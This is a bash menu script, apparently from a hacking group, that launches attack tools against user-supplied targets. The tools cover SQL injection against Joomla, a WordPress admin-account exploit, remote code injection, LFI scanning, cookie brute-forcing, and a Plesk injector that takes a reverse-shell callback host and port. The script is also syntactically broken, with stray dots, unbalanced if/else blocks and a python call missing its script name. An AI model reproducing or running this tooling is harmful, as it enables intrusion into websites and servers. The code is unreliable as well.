#! /bin/bash
##########################################
#########BITCH NO CHANGING RIGHTS#########
##########################################

echo    "######################################################"
echo -e "#\e[1;31m             DarkSouL React0r v1.0                  \e[0m#"
echo -e "#\e[1;31m              by: SpyEyE \e[5mFamily                     \e[0m#"
echo -e "#\e[1;31m              contact:                              \e[0m#"
echo -e "#\e[1;31m              SpyneT.Officiell@gmail.com            \e[0m#"
echo    "#                                                    #"
echo    "######################################################"
#Menu
echo "====================================="
echo -e "\e[32m|Chose Type Of Hacking :            |"
echo "|[1] Priv8 GET Location             |"
echo "|[2] LFI Scann3r                    |"
echo "|[3] Joomla Component com_jumi SQL  |"
echo "|[4] 0Day Wordpress Admin Add       |"
echo "|[5] Remote Code Inject0r           |"
echo "|[6] Apache Vuln Scann3r            |"
echo "|[7] PHP HashTable Exploit3r        |"
echo "|[8] Plesk PHP Inject0r             |"
echo "|[9] YaBB 2.5 Cookies Brute         |"
echo "|[[99] exit ..                      |"
echo "====================================="
read type
if [ $type -eq 1 ]; then

echo " Input Target IP : "
read target

perl Priv8.pl $target

else
     
##########################################
if [ $type -eq 2 ]; then

perl LFI.pl
##########################################
else

if [ $type -eq 3 ]; then

perl sql.pl

else

##########################################
if [ $type -eq 4 ]; then

perl WpPrv.pl

else
##########################################

if [ $type -eq 5 ]; then

echo " Input Target : "
read targ

python RmCodeInject0r.py -h $targ
  
     .

else

##########################################


if [ $type -eq 6 ]; then
echo " Input Target : "
read domains
python wate.py -r $domains

      .
##########################################
if [ $type -eq 7 ]; then
echo " Input Host : "
read host
python Hashtable.py -u $host
  .
  
  else
##########################################
if [ $type -eq 8 ]; then
echo " Input Target PLSK : "
read plsk
echo " Choose Mode (RSH (reverse shell), UP (upload) or SH (inline shell))  "
read modd
echo " Choose File to Upload ( full path ) : "
read uploadfile
echo "Where to put the file on the server (full path) : "
read putfiles
echo "Host to connect back to : "
read backconnect
echo "Port to connect back to : "
read portconnect
echo "Reverse Shell Type - Python or Perl : "
read rvshellz
python --target $plsk --mode $modd --lfile $uploadfile --rfile $putfiles --lhost $backconnect --lport $portconnect --stype $rvshellz
   .
##########################################
else

if [ $type -eq 9 ]; then

perl Cookies.pl
##########################################
    elif [ $type -eq 00 ]; then
	echo "--------------------------"
    echo "-Now you are Leaving      -"
	echo "--------------------------"
     exit
     .
else 
    echo "You made an error ..."
fi
fi
fi
fi
fi
fi
fi
fi
fi
